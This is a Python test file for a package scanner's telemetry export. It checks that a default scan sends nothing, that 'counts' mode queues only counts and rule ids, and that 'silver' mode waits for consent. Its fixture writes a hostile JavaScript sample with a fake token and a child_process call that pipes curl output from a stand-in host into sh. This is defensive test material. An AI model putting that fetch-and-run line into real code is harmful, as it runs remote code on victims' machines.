"""What a scan sends of what it found: nothing by default, counts only when asked, nothing more without consent.

`facts_export` is `off` (the default), `counts` or `silver`. A default scan sends nothing: with the network blocked it makes no connection and queues nothing. With `counts` it queues one record in
the device outbox holding counts and rule ids only, never a package name, path, digest, host or code. `silver` without a consent record queues nothing.
"""

from __future__ import annotations

import json
import socket
from pathlib import Path
from typing import Any

import pytest

from cordon_scanner import Scanner
from cordon_scanner.cloud.facts_export import KIND, FactsExport
from cordon_scanner.cloud.local_store import LocalStore
from cordon_scanner.foundation.config.settings import Config

SECRET_NAME = "zq-private-pkg-name"
SECRET_HOST = "internal-registry.corp.invalid"
SECRET_TOKEN = "ghp_" + "a1B2" * 9
HOSTILE = f"const t = '{SECRET_TOKEN}';\nrequire('child_process').exec('curl -s https://{SECRET_HOST}/x | sh');\n"


class Scan:
    @staticmethod
    def result(root: Path, **overrides: Any) -> Any:
        (root / "package.json").write_text(
            json.dumps({"name": SECRET_NAME, "version": "1.0.0", "main": "lib/index.js"}),
            encoding="utf-8",
        )
        (root / "lib").mkdir(exist_ok=True)
        (root / "lib" / "index.js").write_text(HOSTILE, encoding="utf-8")
        return Scanner(
            Config.default().with_overrides(use_cache=False, offline=True, **overrides)
        ).scan(root)

    @staticmethod
    def pending(store: LocalStore) -> list[dict[str, Any]]:
        return [json.loads(item.body) for item in store.pending() if item.kind == KIND]


class TestADefaultScanSendsNothing:
    def test_the_default_is_off(self) -> None:
        assert Config.default().facts_export == "off"

    def test_with_the_network_blocked_a_default_scan_makes_no_connection_and_queues_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[object] = []

        def blocked(self: socket.socket, address: object) -> None:
            attempts.append(address)
            raise OSError("the network is blocked")

        monkeypatch.setattr(socket.socket, "connect", blocked)
        store = LocalStore(tmp_path / "store")
        result = Scan.result(tmp_path / "pkg" if (tmp_path / "pkg").mkdir() is None else tmp_path)
        assert FactsExport.queue(Config.default().facts_export, store, result) is False
        assert attempts == [] and store.pending() == []

    def test_the_setting_changes_no_finding_and_so_not_the_config_fingerprint(self) -> None:
        assert (
            Config.default().fingerprint()
            == Config.default().with_overrides(facts_export="counts").fingerprint()
        )


class TestCountsOnly:
    def test_one_record_with_the_counts_and_the_rule_ids_is_queued(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        assert FactsExport.queue("counts", store, result) is True
        (record,) = Scan.pending(store)
        assert set(record) == {"scanner", "ecosystem", "files_scanned", "verdicts", "rules"}
        assert record["files_scanned"] >= 2 and sum(record["verdicts"].values()) == 1
        assert record["rules"] and all(
            isinstance(n, int) and n >= 1 for n in record["rules"].values()
        )

    def test_it_holds_no_name_path_host_token_or_code(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        FactsExport.queue("counts", store, result)
        body = json.dumps(Scan.pending(store))
        for text in (
            SECRET_NAME,
            SECRET_HOST,
            SECRET_TOKEN,
            "lib/index.js",
            "child_process",
            "curl",
            str(tmp_path),
        ):
            assert text not in body

    def test_the_same_scan_queued_twice_is_one_record(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        FactsExport.queue("counts", store, result)
        FactsExport.queue("counts", store, result)
        assert len(Scan.pending(store)) == 1


class TestSilverWaitsForConsent:
    def test_silver_without_consent_sends_nothing(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        assert FactsExport.consent() is False
        assert FactsExport.queue("silver", store, result) is False
        assert store.pending() == []

    def test_an_unknown_mode_is_refused(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        with pytest.raises(ValueError, match="facts_export is one of"):
            FactsExport.queue("everything", LocalStore(tmp_path / "store"), result)
